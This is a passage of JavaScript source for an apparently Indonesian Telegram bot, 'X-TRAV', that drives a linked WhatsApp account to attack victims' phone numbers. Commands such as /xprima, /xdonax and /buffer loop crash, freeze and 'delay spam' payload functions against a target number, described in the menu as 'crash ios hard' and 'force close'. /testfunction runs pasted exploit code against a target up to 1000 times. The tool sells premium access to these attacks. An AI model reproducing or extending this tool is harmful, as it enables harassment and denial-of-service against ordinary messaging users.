#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 1.0
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

// ============ CLAIM PREMIUM GROUP ============
const claimGroupsPath = './database/claimGroups.json';

function loadClaimGroups() {
    try {
        if (fs.existsSync(claimGroupsPath)) {
            return JSON.parse(fs.readFileSync(claimGroupsPath, 'utf8'));
        }
    } catch (e) {}
    return [];
}

function saveClaimGroups(groups) {
    const dir = path.dirname(claimGroupsPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(claimGroupsPath, JSON.stringify(groups, null, 2));
}

// ============ MIDDLEWARE GLOBAL CEK PREMIUM ============
bot.use(async (ctx, next) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const command = ctx.message?.text?.split(" ")[0] || "";

    if (userId == ownerID) return next();

    const bugCommands = ['/buffer', '/zvercy', '/zyuxtra', '/xdonax', '/xprima', '/testfunction', '/xspam'];
    if (!bugCommands.some(cmd => command.startsWith(cmd))) return next();

    if (ctx.chat.type === 'private') return next();

    const isPrem = isPremiumUser(userId);

    if (!isPrem) {
        const groups = loadClaimGroups();
        const groupId = chatId.toString();

        if (groups.includes(groupId)) {
            return ctx.reply(`
<blockquote>❌ AKSES DITOLAK!
━━━━━━━━━━━━━━━━━━━━━━
Anda belum premium.

📌 CARA CLAIM PREMIUM:
Ketik /claim di group ini.

⚡ Premium gratis 30 hari!
            `, { parse_mode: 'HTML' });
        } else {
            return ctx.reply(`
❌ AKSES DITOLAK!
━━━━━━━━━━━━━━━━━━━━━━
Anda belum premium.
Hubungi owner untuk mendapatkan akses premium.</blockquote>
            `, { parse_mode: 'HTML' });
        }
    }

    next();
});

// ============ COMMAND CLAIM PREMIUM ============
bot.command("addgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("📌 /addgb -1001234567890");

    const groupId = args[1];
    const groups = loadClaimGroups();

    if (groups.includes(groupId)) return ctx.reply("⚠️ Group sudah terdaftar!");

    groups.push(groupId);
    saveClaimGroups(groups);

    let nama = groupId;
    try { const chat = await ctx.telegram.getChat(groupId); nama = chat.title || groupId; } catch(e) {}

    ctx.reply(`✅ Group berhasil ditambahkan!\n📛 ${nama}\n🆔 ${groupId}`);
});

bot.command("delgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("📌 /delgb -1001234567890");

    const groupId = args[1];
    let groups = loadClaimGroups();

    if (!groups.includes(groupId)) return ctx.reply("❌ Group tidak ditemukan!");

    groups = groups.filter(id => id !== groupId);
    saveClaimGroups(groups);

    ctx.reply(`✅ Group berhasil dihapus!\n🆔 ${groupId}`);
});

bot.command("listgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const groups = loadClaimGroups();

    if (groups.length === 0) return ctx.reply("📭 Belum ada group terdaftar.");

    let list = "<blockquote>📋 DAFTAR GROUP CLAIM PREMIUM\n━━━━━━━━━━━━━━━━━━━━━━\n";
    let i = 1;

    for (const g of groups) {
        let nama = g;
        try { const chat = await ctx.telegram.getChat(g); nama = chat.title || g; } catch(e) {}
        list += `${i}. ${nama}\n   ${g}\n\n`;
        i++;
    }

    list += `━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: ${groups.length} group</blockquote>`;
    ctx.reply(list, { parse_mode: 'HTML' });
});

bot.command("claim", async (ctx) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const chatType = ctx.chat.type;

    if (chatType !== 'group' && chatType !== 'supergroup') {
        return ctx.reply("❌ Hanya di group!");
    }

    if (isPremiumUser(userId)) {
        return ctx.reply("✅ Anda sudah premium!");
    }

    const groups = loadClaimGroups();
    if (!groups.includes(chatId.toString())) {
        return ctx.reply("❌ Group tidak terdaftar mohon untuk owner script untuk gunakan command /addgb -108xxx");
    }

    const duration = 30;
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    const premiumUsers = loadPremiumUsers();
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);

    let nama = chatId;
    try { const chat = await ctx.telegram.getChat(chatId); nama = chat.title || chatId; } catch(e) {}

    ctx.reply(`
<blockquote>🎉 SELAMAT! PREMIUM BERHASIL DI-CLAIM!
━━━━━━━━━━━━━━━━━━━━━━
👤 User: ${ctx.from.first_name}
🆔 ID: ${userId}
📅 Expired: ${expiryDate}
📦 Durasi: ${duration} Hari
📛 Group: ${nama}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Sekarang akses semua fitur premium!</blockquote>
    `, { parse_mode: 'HTML' });

    try {
        await ctx.telegram.sendMessage(ownerID, `🎉 CLAIM PREMIUM!\n👤 ${ctx.from.first_name}\n🆔 ${userId}\n📅 ${expiryDate}\n📛 ${nama}`);
    } catch(e) {}
});

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- 𝙓-𝙏𝙍𝘼𝙑 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const styles = ["primary", "success", "danger"];

let styleIndex = 0;
let menuAnimation = null;

function getCurrentStyle() {
    return styles[styleIndex];
}

function rotateStyle() {

    styleIndex++;

    if (styleIndex >= styles.length) {
        styleIndex = 0;
    }

}

function button(text, callback_data, emoji = "5832251986635920010") {
    return {
        text,
        callback_data,
        style: getCurrentStyle(),
        icon_custom_emoji_id: emoji
    };
}

function urlButton(text, url, emoji = "5807868868886009920") {
    return {
        text,
        url,
        style: getCurrentStyle(),
        icon_custom_emoji_id: emoji
    };
}

function startKeyboard() {

    return [
        [
            button(
                "XSETTINGS",
                "/controls"
            ),
            button(
                "XBUGS",
                "/bug"
            )
        ], 
        [
            urlButton(
                "XDEVELOPER",
                "https://t.me/ZyuuOffc"
            )
        ]
    ];

}

function stopMenuAnimation() {

    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }

}

function startAnimation(ctx, messageId) {

    stopMenuAnimation();

    menuAnimation = setInterval(async () => {

        try {

            rotateStyle();

            await ctx.telegram.editMessageReplyMarkup(
                ctx.chat.id,
                messageId,
                undefined,
                {
                    inline_keyboard: startKeyboard()
                }
            );

        } catch (e) {}

    }, 2000);

}

function getStartCaption(ctx) {
    const senderStatus = isWhatsAppConnected ? "✅ Connected" : "❌ Disconnected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    const userId = user.id;
    const isPremium = isPremiumUser(userId) ? "✅ Premium" : "❌ Free User";

    return `
╭──〔 𝙓-𝙏𝙍𝘼𝙑 𝙈𝙐𝙍𝘽𝙐𝙂𝙎 〕
│ ⌬ Developer : @ZyuuOffc
│ ⌬ Version : 1.0 New Era
│ ⌬ Platform : Telegram
│ ⌬ Type : Bebas Spam Bugs
╰────────────
╭──〔 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 〕
│ ⌬ ID : ${userId}
│ ⌬ Username : ${username}
│ ⌬ Premium : ${isPremium}
╰────────────
╭──〔 𝙎𝙀𝙉𝘿𝙀𝙍 𝙎𝙏𝘼𝙏𝙐𝙎 〕
│ ⌬ Koneksi : ${senderStatus}
╰────────────
`;
}

bot.use((ctx, next) => {

    if (secureMode) return;

    return next();

});

bot.start(async (ctx) => {

    stopMenuAnimation();

    const startCaption = getStartCaption(ctx);

    const msg = await ctx.replyWithPhoto(
        thumbnailUrl,
        {
            caption: startCaption,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: startKeyboard()
            }
        }
    );

    startAnimation(ctx, msg.message_id);

});

bot.action("/start", async (ctx) => {

    stopMenuAnimation();

    try {
        const startCaption = getStartCaption(ctx);

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailUrl,
                caption: startCaption,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: startKeyboard()
                }
            }
        );

        const messageId = ctx.update.callback_query.message.message_id;

        startAnimation(ctx, messageId);

    } catch (e) {

        await ctx.answerCbQuery();

    }

});

bot.action("/controls", async (ctx) => {

    stopMenuAnimation();

    const text = `
╭──〔 𝙓-𝙏𝙍𝘼𝙑 𝙈𝙐𝙍𝘽𝙐𝙂𝙎 〕
│ ⌬ Developer : @ZyuuOffc
│ ⌬ Version : 1.0 New Era
│ ⌬ Platform : Telegram
│ ⌬ Type : Bebas Spam Bugs
╰────────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔  𝑺͒𝒆͢𝒏͠𝒅𝒆͒𝒓͢ 〕
│ ⌬ /requestpair → tambah akses
│ ⌬ /resetsession → reset sesi
│ ⌬ /ceksender → cek koneksi sender 
│ ⌬ /cekall → cek prem, sender dll
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑴͒𝒖͢𝒓͠𝒃𝒖͒𝒈͢ 〕
│ ⌬ /addgcpremium → add prem gc
│ ⌬ /delgcpremium → hapus prem
│ ⌬ /claim → claim premium 30d
│ ⌬ /listgb → list group claim prem
│ ⌬ /delgb → dell group claim prem
│ ⌬ /addgb → add group claim prem
│ ⌬ /setcooldown → set cooldown
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑼͒𝒔͢𝒆͠𝒓͒ 〕
│ ⌬ /addpremium → add premium
│ ⌬ /delpremium → hapus prem
│ ⌬ /cekprem → cek status
╰────────
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "XBACK",
                            "/start"
                        )
                    ]
                ]
            }
        }
    );

});

bot.action("/bug", async (ctx) => {

    stopMenuAnimation();

    const text = `
╭──〔 𝙓-𝙏𝙍𝘼𝙑 𝙈𝙐𝙍𝘽𝙐𝙂𝙎 〕
│ ⌬ Developer : @ZyuuOffc
│ ⌬ Version : 1.0 New Era
│ ⌬ Platform : Telegram
│ ⌬ Type : Bebas Spam Bugs
╰────────────
╭──〔 𝑰͒𝒑͠𝒉͢𝒐𝒏𝒆 𝑩͒𝒖͠𝒈͢𝒔 〕
│ ⌬ /xdonax
│ ╰⊳  crash ios hard
│ ⌬ /xprima
│ ╰⊳  force close ios visible
╰────────────
╭──〔 𝑨͒𝒏͠𝒅͢𝒓𝒐͠𝒊͢𝒅 𝑩͒𝒖͠𝒈͢𝒔 v1 〕
│ ⌬ /xspam
│ ╰⊳ new delay spam
│ ⌬ /zyuxtra
│ ╰⊳  delay invisible x buldo
╰────────────
╭──〔 𝑨͒𝒏͠𝒅͢𝒓𝒐͠𝒊͢𝒅 𝑩͒𝒖͠𝒈͢𝒔 v2 〕
│ ⌬ /zvercy
│ ╰⊳  invisible delay new
│ ⌬ /buffer
│ ╰⊳  new delay chats
╰────────────
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "XBACK",
                            "/start"
                        ),
                    ]
                ]
            }
        }
    );

});

// CASE MURBUG DISINI \\

bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Zverxy 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝚃𝚁𝙰𝚅\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ sᴘᴀᴍ
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY SPAM TO: ${q} ]`)
        );
        await delayInvisible(sock, target);
        await sleep(1500);
      }
    })();

  }
);

bot.command("xprima", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xprima 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝚃𝚁𝙰𝚅\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ sᴘᴀᴍ
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await delayInvisible(sock, target);
        await iosFreeze(sock, target);
        await ComingForYouAtx(sock, target);
        await BlankStc(sock, target);
        await sleep(1500);
      }
    })();

  }
);

bot.command("xdonax", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xdonax 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝚃𝚁𝙰𝚅\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ɪᴏs
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await delayInvisible(sock, target);
        await iosFreeze(sock, target);
        await ComingForYouAtx(sock, target);
        await BlankStc(sock, target);
        await sleep(1500);
      }
    })();

  }
);

bot.command("zyuxtra", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /zyuxtra 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝚃𝚁𝙰𝚅\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ x ʙᴜʟᴅᴏ
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 6; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY BULDO TO: ${q} ]`)
        );
        await delayInvisible(sock, target);
        await sleep(1500);
      }
    })();

  }
);

bot.command("zvercy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /zvercy 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝚃𝚁𝙰𝚅\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ʜᴏᴍᴇ
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 4; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY HOME TO: ${q} ]`)
        );
        await delayInvisible(sock, target);
        await sleep(1500);
      }
    })();

  }
);

bot.command("buffer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /buffer 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝚃𝚁𝙰𝚅\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ғᴏʀᴄᴇ sᴘᴍ
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 7; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY FORCE TO: ${q} ]`)
        );
        await delayInvisible(sock, target);
        await sleep(1500);
      }
    })();

  }
);

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
